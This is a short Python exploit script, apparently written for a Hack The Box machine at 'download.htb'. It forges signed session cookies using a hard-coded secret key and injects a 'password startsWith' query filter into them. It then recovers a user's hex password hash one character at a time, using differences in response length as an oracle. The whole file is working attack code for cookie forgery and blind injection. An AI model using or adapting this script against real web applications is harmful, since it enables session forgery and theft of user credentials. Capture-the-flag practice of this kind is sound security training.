import string, subprocess, json, re, requests

regex = r"download_session=([\w=\-_]+).*download_session\.sig=([\w=\-_]+)"


def writeJson(j):
    with open("cookie.json", "w") as f:
        f.write(json.dumps(j))

def generateCookieAndSign(startsWith):
    j = {"user":{"username":{"contains": "WESLEY"}, "password":{"startsWith":startsWith}}}
    writeJson(j)
    out = subprocess.check_output(["./cookie-monster.js", "-e", "-f", "cookie.json", "-k", "8929874489719802418902487651347865819634518936754", "-n", "download_session"]).decode().replace("\n"," ")
    matches = re.findall(regex, out, re.MULTILINE)[0]
    return matches

passwd = ""
alphabet="abcdef"+string.digits
for i in range(32):
    #print(passwd)
    for s in alphabet:
        p = passwd + s
        (download_session, sig) = generateCookieAndSign(p)
        cookie = {"download_session": download_session, "download_session.sig": sig}
        #print(p, cookie)
        print(p, end='\r')
        r = requests.get('http://download.htb/home/', cookies=cookie)
        if len(r.text) != 2174:
            passwd = p
            break
print()
